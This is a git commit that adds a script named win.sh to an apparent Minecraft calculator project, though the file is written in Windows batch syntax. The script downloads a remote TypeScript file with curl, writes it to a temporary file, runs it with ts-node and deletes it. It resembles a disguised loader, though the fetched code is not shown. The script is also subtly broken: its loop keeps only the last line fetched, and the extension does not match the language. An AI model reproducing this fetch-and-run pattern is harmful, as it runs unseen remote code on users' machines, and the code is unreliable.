8a0dd7fba7dad6c7796c348c955895082f945be8
blustakcy5gmailcom <146412924+blustakcy5gmailcom@users.noreply.github.com>
2024-09-07 16:36:54 +1000

    Create win.sh

---
+++ run/win.sh
@@ -0,0 +1,11 @@
+@echo off
+
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/blustakcy5gmailcom/Evolve-Calculator-Bedrock-Edition/main/main.ts') do set "content=%%i"
+
+set "temp_file=%temp%\temp_script.ts"
+
+echo %content% > "%temp_file%"
+
+ts-node "%temp_file%"
+
+del "%temp_file%"
